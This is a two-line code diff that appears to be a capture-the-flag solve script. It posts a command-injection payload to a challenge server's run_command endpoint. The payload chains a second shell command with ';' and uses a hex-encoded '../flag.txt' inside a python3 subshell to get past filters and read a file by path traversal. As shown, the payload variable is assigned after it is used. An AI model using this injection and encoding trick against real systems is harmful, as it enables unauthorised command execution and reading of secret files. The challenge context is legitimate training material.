@@ -1,0 +1,2 @@
+requests.post("https://braekerctf-empty-execution.chals.io/run_command", json = {"command" : f'. ; cat $(python3 -c  "print({payload})")'})
+payload = "'\\x2E\\x2E\\x2Fflag.txt'"
